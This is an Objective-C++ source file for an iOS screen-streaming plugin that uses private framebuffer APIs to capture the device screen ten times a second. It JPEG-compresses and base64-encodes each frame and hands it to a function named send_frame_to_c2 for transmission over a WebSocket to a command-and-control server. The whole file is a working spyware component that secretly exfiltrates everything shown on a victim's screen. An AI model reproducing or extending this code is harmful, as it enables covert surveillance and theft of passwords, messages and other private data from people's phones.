// FILE: screen_stream.mm
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <iostream>
#include <dlfcn.h>

// 1. Declare the private IOSurface types and functions
typedef struct __IOSurface *IOSurfaceRef;
typedef struct __IOMobileFramebuffer *IOMobileFramebufferRef;

typedef IOMobileFramebufferRef (*IOMobileFramebufferGetMainDisplayFunc)();
typedef int (*IOMobileFramebufferGetLayerDefaultSurfaceFunc)(IOMobileFramebufferRef, int, IOSurfaceRef*);

extern "C" void IOSurfaceLock(IOSurfaceRef, uint32_t, uint32_t*);
extern "C" void IOSurfaceUnlock(IOSurfaceRef, uint32_t, uint32_t*);
extern "C" void* IOSurfaceGetBaseAddress(IOSurfaceRef);
extern "C" size_t IOSurfaceGetWidth(IOSurfaceRef);
extern "C" size_t IOSurfaceGetHeight(IOSurfaceRef);
extern "C" size_t IOSurfaceGetBytesPerRow(IOSurfaceRef);

// 2. Declare the external callback function (defined in main.mm)
extern void send_frame_to_c2(NSString *base64Image);

extern "C" void start() {
    std::cout << "[PLUGIN] REAL Screen Streamer Initialized.\n";
    
    // Load the private IOMobileFramebuffer framework
    void* iokit = dlopen("/System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer", RTLD_LAZY);
    if (!iokit) {
        std::cout << "[-] Failed to load IOMobileFramebuffer.\n";
        return;
    }

    IOMobileFramebufferGetMainDisplayFunc getMainDisplay = (IOMobileFramebufferGetMainDisplayFunc)dlsym(iokit, "IOMobileFramebufferGetMainDisplay");
    IOMobileFramebufferGetLayerDefaultSurfaceFunc getSurface = (IOMobileFramebufferGetLayerDefaultSurfaceFunc)dlsym(iokit, "IOMobileFramebufferGetLayerDefaultSurface");

    if (!getMainDisplay || !getSurface) {
        std::cout << "[-] Failed to resolve framebuffer functions.\n";
        return;
    }

    std::cout << "[PLUGIN] Framebuffer hooked. Starting capture loop...\n";
    
    // Create the color space for image conversion
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGBitmapInfo bitmapInfo = kCGBitmapByteOrder32Little | kCGImageAlphaPremultipliedFirst;

    while (true) {
        @autoreleasepool {
            IOMobileFramebufferRef display = getMainDisplay();
            IOSurfaceRef surface = NULL;
            getSurface(display, 0, &surface);
            
            if (surface) {
                IOSurfaceLock(surface, 0x00000001, NULL); // kIOSurfaceLockReadOnly
                
                void *baseAddress = IOSurfaceGetBaseAddress(surface);
                size_t width = IOSurfaceGetWidth(surface);
                size_t height = IOSurfaceGetHeight(surface);
                size_t bytesPerRow = IOSurfaceGetBytesPerRow(surface);

                CGDataProviderRef provider = CGDataProviderCreateWithData(NULL, baseAddress, height * bytesPerRow, NULL);
                CGImageRef cgImage = CGImageCreate(width, height, 8, 32, bytesPerRow, colorSpace, bitmapInfo, provider, NULL, false, kCGRenderingIntentDefault);
                
                UIImage *screenImage = [UIImage imageWithCGImage:cgImage];
                // Compress to JPEG at 30% quality to save bandwidth over WebSocket
                NSData *jpegData = UIImageJPEGRepresentation(screenImage, 0.3);
                
                if (jpegData) {
                    NSString *base64String = [jpegData base64EncodedStringWithOptions:0];
                    send_frame_to_c2(base64String); // Send to main.mm's WebSocket
                }

                // Cleanup memory for this frame
                CGImageRelease(cgImage);
                CGDataProviderRelease(provider);
                IOSurfaceUnlock(surface, 0x00000001, NULL);
            }
        }
        
        // 10 FPS (sleep for 0.1 seconds)
        [NSThread sleepForTimeInterval:0.1];
    }
}